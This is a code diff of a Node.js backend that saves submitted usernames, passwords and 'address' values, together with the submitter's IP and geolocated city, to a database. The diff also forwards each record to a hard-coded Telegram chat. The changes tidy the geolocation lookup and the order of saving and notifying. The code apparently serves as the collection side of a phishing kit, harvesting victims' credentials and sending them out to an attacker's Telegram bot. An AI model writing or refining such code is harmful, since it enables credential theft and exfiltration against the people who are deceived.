@@ -39,19 +39,13 @@ const CHAT_ID = "8559945003";
 
 async function getLocation(ip) {
     if (!ip || ip === 'Unknown') return 'Unknown Location';
-    const services = [
-        `http://ip-api.com/json/${ip}?fields=city,country`,
-        `https://ipapi.co/${ip}/json/`
-    ];
-    for (const url of services) {
-        try {
-            const res = await fetch(url, { timeout: 5000 });
-            const data = await res.json();
-            if (data.city || data.country_name) {
-                return `${data.city || ''}, ${data.country_name || data.country || ''}`.trim() || 'Unknown Location';
-            }
-        } catch (e) {}
-    }
+    try {
+        const res = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`, { timeout: 5000 });
+        const data = await res.json();
+        if (data.city || data.country) {
+            return `${data.city || ''}, ${data.country || ''}`.trim() || 'Unknown Location';
+        }
+    } catch (e) {}
     return 'Unknown Location';
 }
 
@@ -88,25 +82,17 @@ async function sendTelegramNotification(record) {
 
 async function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
-    let location = 'Unknown Location';
+    const location = await getLocation(ip);
 
     try {
-        // Save record first
         await pool.query(
             "INSERT INTO records (type, username, password, address, ip, location, timestamp) VALUES ($1, $2, $3, $4, $5, $6, $7)",
             [type, username, password, address, ip, location, timestamp]
         );
 
-        // Send notification immediately
-        await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
+        console.log(`✅ SAVED: ${type} | Location: ${location}`);
 
-        // Try to get better location in background
-        if (ip !== 'Unknown') {
-            const betterLocation = await getLocation(ip);
-            if (betterLocation !== 'Unknown Location') {
-                await pool.query("UPDATE records SET location = $1 WHERE timestamp = $2", [betterLocation, timestamp]);
-            }
-        }
+        await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
 
     } catch (err) {
         console.error("Save Error:", err.message);
